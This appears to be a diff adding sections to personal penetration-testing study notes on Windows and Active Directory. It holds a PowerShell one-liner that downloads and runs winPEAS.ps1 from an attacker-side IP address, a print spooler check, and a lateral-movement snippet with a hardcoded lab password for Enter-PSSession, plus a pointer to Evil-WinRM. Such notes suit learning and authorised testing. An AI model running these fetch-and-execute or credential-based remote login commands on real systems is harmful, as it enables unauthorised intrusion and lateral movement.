@@ -3,6 +3,13 @@
 
 
 
+### Host enumeration
+
+**can be automated with winPEAS.ps1**
+```powershell
+IEX(New-Object Net.WebClient).downloadString('http://192.168.45.247/winPEAS.ps1')
+```
+[winPEAS.ps1 download](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
 
 **Enumeration requirements**
 
@@ -48,6 +55,27 @@ Check to see if print spooler is running
 ls "\dc01\pipe\spoolss"
 
 
+
+### Lateral movement techniques  
+<br>
+- Lateral movement with Enter-PSSession:
   
+``` Powershell
+$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
+Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+```
+<br>
+- Lateral movement with Evil-winrm(apparently enter-pssession isnt too stable)
+[Evil-WinRm github](https://github.com/Hackplayers/evil-winrm)
+
+**WinRm is on port 5985**
+
+<img width="835" height="725" alt="image" src="https://github.com/user-attachments/assets/13bc6534-e9d7-49a6-8c61-a06f995ea0cb" />
+
+
+
+- 
+
 
   
